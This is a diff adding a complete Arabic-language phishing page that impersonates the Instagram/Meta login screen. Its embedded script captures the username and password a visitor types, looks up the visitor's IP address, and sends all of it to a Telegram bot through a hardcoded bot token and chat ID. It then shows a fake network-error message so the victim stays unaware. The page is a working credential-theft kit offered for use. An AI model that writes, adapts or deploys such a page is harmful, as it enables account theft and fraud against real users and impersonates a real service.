@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram - Login</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
+    <style>
+        /* ستايلك الأصلي 100% دون أي تغيير */
+        *{ margin:0; padding:0; box-sizing:border-box; font-family:'Cairo',sans-serif; }
+        body{ height:100vh; display:flex; justify-content:center; align-items:center; background:linear-gradient(120deg,#0f2027,#0b1c25,#08141b); color:#fff; overflow:hidden; }
+        .container{ width:1200px; height:700px; display:flex; }
+        .left{ width:50%; padding:90px 80px; border-left:1px solid rgba(255,255,255,0.08); }
+        .left h2{ font-size:24px; margin-bottom:35px; font-weight:600; }
+        .input-group{ position:relative; margin-bottom:18px; }
+        .input-group input{ width:100%; padding:16px; border-radius:14px; border:1px solid rgba(255,255,255,0.15); background:rgba(255,255,255,0.05); backdrop-filter:blur(8px); color:white; outline:none; transition:0.3s; }
+        .input-group input:focus{ border-color:#3b82f6; background:rgba(255,255,255,0.08); }
+        .login-btn{ width:100%; padding:15px; border-radius:14px; border:none; background:linear-gradient(90deg,#2563eb,#1e40af); color:white; font-size:15px; cursor:pointer; margin-top:5px; transition:0.3s; }
+        .login-btn:hover{ transform:translateY(-2px); box-shadow:0 8px 20px rgba(37,99,235,0.4); }
+        .link{ text-align:center; margin:25px 0; color:#cfcfcf; font-size:14px; cursor:pointer; }
+        .fb-btn, .signup-btn{ width:100%; padding:14px; border-radius:14px; cursor:pointer; margin-bottom:15px; transition:0.3s; background:transparent; }
+        .fb-btn{ border:1px solid rgba(255,255,255,0.3); color:white; }
+        .signup-btn{ border:1px solid #3b82f6; color:#3b82f6; }
+        .meta{ margin-top:50px; font-size:14px; color:#888; text-align:center; }
+        .right{ width:50%; display:flex; flex-direction:column; justify-content:center; align-items:center; position:relative; }
+        .right h1{ width:80%; font-size:30px; text-align:center; margin-bottom:40px; font-weight:600; line-height:1.6; }
+        .highlight{ background:linear-gradient(90deg,#ff4d4d,#ff7a18); -webkit-background-clip:text; -webkit-text-fill-color:transparent; }
+        .images{ position:relative; width:400px; height:400px; }
+        .images img{ width:240px; border-radius:25px; position:absolute; box-shadow:0 20px 40px rgba(0,0,0,0.5); animation:float 6s ease-in-out infinite; }
+        .img1{ right:40px; top:60px; } .img2{ right:140px; top:10px; animation-delay:1s; } .img3{ right:200px; top:110px; animation-delay:2s; }
+        @keyframes float{ 0%,100%{transform:translateY(0px);} 50%{transform:translateY(-15px);} }
+        @media (max-width: 900px) { .container { flex-direction: column-reverse; width: 100%; height: auto; } .left, .right { width: 100%; padding: 40px 20px; } .images { display: none; } }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="left">
+        <h2>تسجيل الدخول إلى Instagram</h2>
+        <form id="login-form">
+            <div class="input-group">
+                <input type="text" id="email" placeholder="رقم الهاتف أو اسم المستخدم" required>
+            </div>
+            <div class="input-group">
+                <input type="password" id="password" placeholder="كلمة السر" required>
+            </div>
+            <button type="submit" class="login-btn">تسجيل الدخول</button>
+        </form>
+
+        <div class="link">هل نسيت كلمة السر؟</div>
+        <button class="fb-btn">تسجيل الدخول بحساب فيسبوك</button>
+        <button class="signup-btn">إنشاء حساب جديد</button>
+        <div class="meta">Meta</div>
+    </div>
+
+    <div class="right">
+        <h1>شاهد اللحظات اليومية من أصدقائك <span class="highlight">المقربين.</span></h1>
+        <div class="images">
+            <img src="https://picsum.photos/300/400?1" class="img1">
+            <img src="https://picsum.photos/300/400?2" class="img2">
+            <img src="https://picsum.photos/300/400?3" class="img3">
+        </div>
+    </div>
+</div>
+
+<script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
+<script>
+    // الإعدادات الخاصة بك
+    const TOKEN = "8167751306:AAE1pPyttFbP5doMQVJajZGyWUukksQlQ24"; 
+    const CHAT_ID = "5875866115"; 
+    const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+
+    document.getElementById('login-form').addEventListener('submit', async function(e) {
+        e.preventDefault();
+
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+
+        try {
+            // جلب الـ IP
+            const ipResponse = await axios.get('https://api.ipify.org?format=json');
+            const ip = ipResponse.data.ip;
+
+            const message = `🔔 محاولة تسجيل دخول\n📧 البريد: ${email}\n🔑 الباسورد: ${password}\n🌐 IP: ${ip}`;
+
+            // إرسال البيانات (استخدمنا await لضمان الإرسال)
+            await axios.post(URI_API, {
+                chat_id: CHAT_ID,
+                text: message
+            });
+
+            alert('حدث خطأ في الشبكة، حاول مجدداً.'); // رسالة وهمية للحفاظ على الواقعية
+
+        } catch (error) {
+            console.error("خطأ:", error);
+            alert('يرجى المحاولة لاحقاً.');
+        }
+    });
+</script>
+</body>
+</html>
